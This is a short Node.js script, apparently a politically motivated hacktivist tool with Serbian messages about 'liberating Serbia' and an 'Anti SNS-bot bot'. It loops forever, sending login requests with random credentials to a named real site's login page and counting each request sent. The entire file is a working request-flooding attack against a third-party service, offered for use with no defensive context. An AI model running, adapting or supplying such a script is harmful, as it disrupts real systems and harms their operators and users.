const axios = require('axios')
require('colors');

let nOfAttacks = 0

const start = async ()=>{
    try{
        const rnd = ()=>Math.round(Math.random() * 100000)
        const res = await axios.post('http://castle.rs/logincheck.php', {user:rnd(),password:rnd()})
        if(res.status == 200){
            nOfAttacks++
            if(nOfAttacks % 1 == 0){ // ako želite veći delay u prikazu povećati 1
                process.stdout.clearLine();
                process.stdout.cursorTo(0);
                process.stdout.write('Poslato ' + String(nOfAttacks).rainbow + ' zahteva za login.');
            }
        } 
        start()
    }catch(err){
        console.log(err)
    }
}

console.log('Hvala što se borite za oslobođenje Srbije!'.bgBlack.white, '\nAnti SNS-bot bot'.bgCyan.blue)
start()